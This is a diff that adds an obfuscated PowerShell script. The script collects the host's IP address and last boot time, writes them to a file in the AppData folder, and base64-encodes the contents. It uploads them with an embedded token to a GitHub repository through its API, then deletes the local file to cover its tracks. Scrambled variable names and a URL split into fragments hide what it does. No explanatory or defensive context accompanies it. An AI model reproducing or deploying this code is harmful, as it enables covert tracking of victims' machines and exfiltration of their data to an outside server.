@@ -1,0 +1,20 @@
+$hgfjhgsaf = (Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.IPAddress -ne $null }).IPAddress[0]
+$cyhwjehbf = Get-Date -Format "MMdd_HHmm"
+$ffffjhejkhrtu3 = "$hgfjhgsaf-$cyhwjehbf-XXX-kkk.txt"
+$ssdjsvuewrjhtb = Join-Path $env:appdata $ffffjhejkhrtu3
+(Get-CimInstance Win32_OperatingSystem).LastBootUpTime | Out-File -FilePath $ssdjsvuewrjhtb
+$aaahgy218sfdh = "htt"+"ps"+":/"+"/a" + "pi.g" + "ith" + "ub.com/re" + "pos/kamhavin/test/contents/store/" + $ffffjhejkhrtu3
+$gggwhjkjrh = "hjdghkjahghioguhi"
+$ffhuiwe9f7sd = Get-Content -Path $ssdjsvuewrjhtb -Encoding Byte
+$ffghy672jhdwe = [Convert]::ToBase64String($ffhuiwe9f7sd)
+$bbbhjdkhje = @{
+    message = "Upload file $ffffjhejkhrtu3"
+    content = $ffghy672jhdwe
+    branch = "main"
+}
+$hhjeuidk2rf2 = @{
+    "Authorization" = "token $gggwhjkjrh"
+    "Content-Type" = "application/json"
+}
+$rrrruif099782ijf = Invoke-RestMethod -Uri $aaahgy218sfdh -Method Put -Body ($bbbhjdkhje | ConvertTo-Json) -Headers $hhjeuidk2rf2
+Remove-Item -Path $ssdjsvuewrjhtb -Force;
